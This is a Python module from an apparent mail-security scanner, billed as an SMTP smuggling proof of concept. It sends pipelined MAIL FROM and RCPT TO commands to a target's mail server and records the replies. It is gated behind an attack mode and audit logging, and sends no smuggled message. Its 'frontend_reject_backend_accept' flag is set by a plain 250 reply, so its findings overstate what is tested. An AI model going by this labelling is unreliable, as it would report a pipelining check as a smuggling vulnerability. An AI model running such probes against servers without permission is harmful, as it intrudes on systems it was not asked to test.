"""
SMTP smuggling / parsing edge-case PoC — ATTACK MODE only.
Tests frontend vs backend parsing difference (RFC edge-case command order).
No DoS; no flood; safe attempt only.
"""
import logging
from core.context import ScanContext
from core.utils import safe_socket_connect, read_line, get_smtp_host
from core.attack_mode import require_attack_mode, enforce_rate_limit, get_test_from_domain, get_test_rcpt_address
from core.constants import SMTP_PORT, SMTP_EXPLOIT_TIMEOUT, EHLO_IDENTITY

logger = logging.getLogger("mailt.smtp.exploit")


def _send(sock, cmd: str) -> None:
    sock.sendall((cmd + "\r\n").encode("utf-8"))


def run(ctx: ScanContext) -> None:
    if not require_attack_mode(ctx):
        return
    enforce_rate_limit("smtp_smuggling_poc")
    mx_host = get_smtp_host(ctx)
    from_addr = f"mailt-poc@{get_test_from_domain()}"
    to_addr = get_test_rcpt_address()

    result = {
        "exploit_attempted": True,
        "frontend_reject_backend_accept": False,
        "proof_of_execution": None,
        "pipelined_mail_from_code": None,
        "pipelined_rcpt_to_code": None,
        "error": None,
    }
    sock = safe_socket_connect(mx_host, SMTP_PORT, SMTP_EXPLOIT_TIMEOUT)
    if not sock:
        result["error"] = "connection_failed"
        ctx.add_smtp_data("smtp_smuggling_poc", result)
        ctx.log_exploit_audit("smtp_smuggling_poc", "smuggling_poc", "connection_failed", result)
        return
    try:
        read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        _send(sock, f"EHLO {EHLO_IDENTITY}")
        while True:
            line = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
            if not line or (len(line) >= 3 and line[3:4] != "-" and line[:3] == "250"):
                break
        # RFC edge-case: send MAIL FROM and RCPT TO without waiting for 250 (pipelining)
        _send(sock, f"MAIL FROM:<{from_addr}>")
        _send(sock, f"RCPT TO:<{to_addr}>")
        line1 = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        line2 = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        result["pipelined_mail_from_code"] = line1[:3] if line1 else None
        result["pipelined_rcpt_to_code"] = line2[:3] if line2 else None
        result["proof_of_execution"] = f"MAIL FROM: {line1}; RCPT TO: {line2}"
        if line2 and line2.startswith("250"):
            result["frontend_reject_backend_accept"] = True
        _send(sock, "QUIT")
        ctx.log_exploit_audit("smtp_smuggling_poc", "smuggling_poc", "pipelining_accepted" if (line2 and line2.startswith("250")) else "rejected", result)
    except Exception as e:
        result["error"] = str(e)
        ctx.log_exploit_audit("smtp_smuggling_poc", "smuggling_poc", "error", {"error": str(e)})
    finally:
        try:
            sock.close()
        except OSError:
            pass
    ctx.add_smtp_data("smtp_smuggling_poc", result)
    if ctx.verbose:
        logger.debug("SMTP smuggling PoC: pipelining_accept=%s", result.get("frontend_reject_backend_accept"))
